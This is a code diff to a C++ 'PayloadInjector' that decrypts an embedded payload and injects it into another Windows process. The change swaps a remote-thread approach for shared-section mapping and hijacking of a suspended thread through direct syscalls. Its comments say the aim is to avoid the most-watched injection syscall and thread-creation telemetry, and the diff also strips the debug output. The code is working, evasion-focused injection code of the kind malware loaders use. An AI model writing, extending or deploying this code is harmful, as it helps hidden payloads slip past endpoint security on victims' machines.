@@ -6,6 +6,14 @@
 #include "../sys/internal_api.hpp"
 #include "../../build/payload_data.hpp"
 #include <sstream>
+#include <TlHelp32.h>
+
+#ifndef SEC_COMMIT
+#define SEC_COMMIT 0x8000000
+#endif
+#ifndef ViewShare
+#define ViewShare 1
+#endif
 
 namespace Injector {
 
@@ -13,64 +21,94 @@ namespace Injector {
         : m_process(process), m_console(console) {}
 
     void PayloadInjector::Inject(const std::wstring& pipeName) {
-        m_console.Debug("Deriving runtime decryption keys...");
         LoadAndDecryptPayload();
-        m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");
 
         DWORD offset = GetExportOffset("Bootstrap");
-        if (offset == 0) {
-            throw std::runtime_error("Could not find entry point in payload");
-        }
-        
-        std::stringstream ss;
-        ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
-        m_console.Debug(ss.str());
+        if (offset == 0) throw std::runtime_error("Bootstrap export not found");
 
+        SIZE_T payloadSize   = m_payload.size();
+        SIZE_T pipeNameSize  = (pipeName.length() + 1) * sizeof(wchar_t);
+        SIZE_T totalSize     = payloadSize + pipeNameSize;
+
+        // ── Section-based injection (replaces NtAllocateVirtualMemory + NtWriteVirtualMemory) ──
+        // Create a shared section, map locally to write the payload, then map into target process.
+        // NtWriteVirtualMemory never called — avoids the most-watched injection syscall.
+        HANDLE hSection = nullptr;
+        LARGE_INTEGER sectionSize = {};
+        sectionSize.QuadPart = static_cast<LONGLONG>(totalSize);
+
+        NTSTATUS status = NtCreateSection_syscall(
+            &hSection, 0xF001F /*SECTION_ALL_ACCESS*/, nullptr,
+            &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
+        if (!NT_SUCCESS(status)) throw std::runtime_error("NtCreateSection failed");
+
+        // Map locally (writable) to copy payload + pipe name
+        PVOID localBase = nullptr;
+        SIZE_T viewSize = totalSize;
+        status = NtMapViewOfSection_syscall(
+            hSection, GetCurrentProcess(), &localBase,
+            0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
+        if (!NT_SUCCESS(status)) { NtClose_syscall(hSection); throw std::runtime_error("Local map failed"); }
+
+        memcpy(localBase, m_payload.data(), payloadSize);
+        memcpy(reinterpret_cast<uint8_t*>(localBase) + payloadSize,
+               pipeName.c_str(), pipeNameSize);
+
+        NtUnmapViewOfSection_syscall(GetCurrentProcess(), localBase);
+
+        // Map into target process (executable, no write)
         PVOID remoteBase = nullptr;
-        SIZE_T payloadSize = m_payload.size();
-        SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
-        SIZE_T totalSize = payloadSize + pipeNameSize;
+        viewSize = totalSize;
+        status = NtMapViewOfSection_syscall(
+            hSection, m_process.GetProcessHandle(), &remoteBase,
+            0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_EXECUTE_READ);
+        NtClose_syscall(hSection);
+        if (!NT_SUCCESS(status)) throw std::runtime_error("Remote map failed");
 
-        m_console.Debug("Allocating memory in target process via syscall...");
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
-                                                          &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (status != 0) throw std::runtime_error("Allocation failed");
+        PVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
+        uintptr_t entry      = reinterpret_cast<uintptr_t>(remoteBase) + offset;
 
-        ss.str("");
-        ss << "  [+] Memory allocated at 0x" << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
-           << " (" << std::dec << (totalSize / 1024) << " KB)";
-        m_console.Debug(ss.str());
+        // ── Thread hijacking (replaces NtCreateThreadEx) ──
+        // Find the main thread of the suspended target process and overwrite its RIP.
+        // No new thread is created — no NtCreateThreadEx telemetry.
+        DWORD targetPid = GetProcessId(m_process.GetProcessHandle());
+        HANDLE hThread  = nullptr;
 
-        SIZE_T written = 0;
-        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
-                                              m_payload.data(), payloadSize, &written);
-        if (status != 0) throw std::runtime_error("Write payload failed");
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            THREADENTRY32 te = { sizeof(te) };
+            if (Thread32First(snap, &te)) {
+                do {
+                    if (te.th32OwnerProcessID == targetPid) {
+                        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                        break;
+                    }
+                } while (Thread32Next(snap, &te));
+            }
+            CloseHandle(snap);
+        }
+        if (!hThread) throw std::runtime_error("Target thread not found");
 
-        LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
-        status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remotePipeName,
-                                              (PVOID)pipeName.c_str(), pipeNameSize, &written);
-        if (status != 0) throw std::runtime_error("Write params failed");
-        m_console.Debug("  [+] Payload + parameters written");
+        // Thread is already suspended (CREATE_SUSPENDED) — overwrite context
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_FULL;
+        status = NtGetContextThread_syscall(hThread, &ctx);
+        if (!NT_SUCCESS(status)) { CloseHandle(hThread); throw std::runtime_error("GetContext failed"); }
 
-        ULONG oldProtect = 0;
-        status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
-                                                &totalSize, PAGE_EXECUTE_READ, &oldProtect);
-        if (status != 0) throw std::runtime_error("Protection change failed");
-        m_console.Debug("  [+] Memory protection set to PAGE_EXECUTE_READ");
+#if defined(_M_X64)
+        ctx.Rip = entry;
+        ctx.Rcx = reinterpret_cast<ULONG64>(remotePipeName);
+#elif defined(_M_ARM64)
+        ctx.Pc  = entry;
+        ctx.X0  = reinterpret_cast<ULONG64>(remotePipeName);
+#endif
 
-        uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
-        HANDLE hThread = nullptr;
+        status = NtSetContextThread_syscall(hThread, &ctx);
+        if (!NT_SUCCESS(status)) { CloseHandle(hThread); throw std::runtime_error("SetContext failed"); }
 
-        m_console.Debug("Creating remote thread via syscall...");
-        status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
-                                          (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, 0, 0, 0, nullptr);
-        
-        if (status != 0) throw std::runtime_error("Thread creation failed");
-
-        ss.str("");
-        ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
-        m_console.Debug(ss.str());
-        if (hThread) NtClose_syscall(hThread);
+        NtFlushInstructionCache_syscall(m_process.GetProcessHandle(), remoteBase, (ULONG)totalSize);
+        NtResumeThread_syscall(hThread, nullptr);
+        CloseHandle(hThread);
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
